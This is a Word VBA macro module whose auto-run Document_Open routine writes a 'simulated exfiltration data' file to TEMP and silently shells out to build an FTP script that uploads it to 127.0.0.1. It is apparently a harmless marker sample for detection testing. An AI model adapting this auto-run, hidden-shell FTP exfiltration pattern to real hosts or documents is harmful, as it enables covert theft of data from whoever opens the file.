Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim f As Integer, logPath As String
    logPath = Environ("TEMP") & "\oblivionx_log.txt"
    f = FreeFile
    Open logPath For Output As #f
    Print #f, "marker-ftp-log: simulated exfiltration data"
    Close #f
    Shell "cmd /c echo open 127.0.0.1> " & Environ("TEMP") & "\oblivionx_ftp.txt & echo put oblivionx_log.txt>> " & Environ("TEMP") & "\oblivionx_ftp.txt & echo quit>> " & Environ("TEMP") & "\oblivionx_ftp.txt", 0
End Sub
